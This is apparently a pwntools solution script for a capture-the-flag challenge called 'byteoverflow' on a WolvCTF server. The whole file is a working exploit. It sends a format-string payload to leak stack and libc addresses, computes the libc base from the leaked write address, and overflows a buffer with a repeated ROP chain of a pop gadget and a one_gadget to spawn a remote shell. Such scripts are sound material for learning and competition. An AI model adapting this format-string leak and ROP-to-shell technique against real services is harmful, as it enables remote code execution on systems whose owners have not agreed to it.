from pwn import *

libc = ELF("libc6_2.31-0ubuntu9.14_amd64.so")

# p = process("./byteoverflow")
# gdb.attach(p, gdbscript="""
# b *0x4012b2
# c
# """)

p = remote("byteoverflow.wolvctf.io", 1337)

p.recvuntil(b"3) EXIT")
p.recvline()
p.sendline(b"2")

p.recvuntil(b"below:")
p.recvline()
p.sendline(b"%13$p%19$p%45$p") # write and leak stack and libc
# started with %4199376x%13$n previously but doesnt seem necessary ;( ;( ;(

p.recvuntil(b"0x")
leak = p.recvline().decode()
stack_leak = int("0x" + leak[:12], 16)
write_leak = int(leak[12:26], 16) - 23 # found this out later, brute forced libc-database slightly
libc_ret_leak = int(leak[26:], 16)
libc.address = write_leak - libc.sym["write"]


log.success(f"{hex(stack_leak)=}")
# log.success(f"{hex(write_leak)=}")
# log.success(f"{hex(libc_ret_leak)=}")
log.success(f"{hex(libc.address)=}")

end_byte = (stack_leak & 0xff) - 0x28
one_gadget = libc.address + 0xe3afe
pop_regs = 0x0000000000401484

payload =  p64(pop_regs) 
payload += b"\x00"*8 
payload += p64(one_gadget)
payload *= 10
payload += b"A"*16 + b"\x00"

p.recvuntil(b"3) EXIT")
p.recvline()
p.sendline(b"1")

p.recvuntil(b"Stealth Mode")
p.recvline()
p.sendline(payload)

p.interactive()